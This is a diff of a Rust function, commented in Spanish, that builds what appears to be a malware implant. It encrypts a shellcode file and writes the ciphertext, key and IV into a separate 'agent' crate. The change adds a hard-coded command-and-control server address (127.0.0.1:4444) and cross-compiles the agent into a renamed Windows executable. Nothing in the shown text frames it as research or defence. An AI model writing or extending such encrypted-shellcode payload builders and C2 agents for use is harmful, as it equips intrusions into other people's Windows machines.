@@ -50,25 +50,34 @@ pub fn generate_agent(shellcode_file: &str, output_name: &str) -> Result<(), Box
 
     println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());
 
-    // === NUEVO ===
+    // Crear directorios si no existen
+    std::fs::create_dir_all("../agent/src")?;
+
     // Generar config.rs dentro del crate `agent`
-    let mut config_file = File::create("agent/src/config.rs")?;
+    let mut config_file = File::create("../agent/src/config.rs")?;
     writeln!(config_file, "pub const ENCRYPTED_SHELLCODE: &[u8] = &{:?};", encrypted_data)?;
     writeln!(config_file, "pub const KEY: &[u8] = &{:?};", key)?;
     writeln!(config_file, "pub const IV: &[u8] = &{:?};", iv)?;
+    writeln!(config_file, "pub const C2_SERVER: &str = \"127.0.0.1:4444\";")?; // Agregar servidor C2
 
-    println!("✅ Configuración escrita en agent/src/config.rs");
+    println!("✅ Configuración escrita en ../agent/src/config.rs");
 
-        // Compilar el crate agent
-        let output = Command::new("cargo")
-            .args(&["build", "--release", "-p", "agent", "--target", "x86_64-pc-windows-gnu"])
-            .output()?;
-
+    // Compilar el crate agent (cambiar directorio de trabajo)
+    let output = Command::new("cargo")
+        .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
+        .current_dir("../agent") // Ejecutar desde el directorio del agente
+        .output()?;
 
     if output.status.success() {
         println!("✅ Compilación exitosa!");
-        let exe_path = format!("target/release/{}.exe", output_name);
+        let exe_path = format!("../agent/target/x86_64-pc-windows-gnu/release/agent.exe");
         println!("🏃 Ejecutable generado en {}", exe_path);
+        
+        // Copiar el ejecutable al directorio actual con el nombre deseado
+        let dest_path = format!("{}.exe", output_name);
+        if let Ok(_) = std::fs::copy(&exe_path, &dest_path) {
+            println!("📦 Ejecutable copiado como: {}", dest_path);
+        }
     } else {
         println!("❌ Error durante la compilación:");
         println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
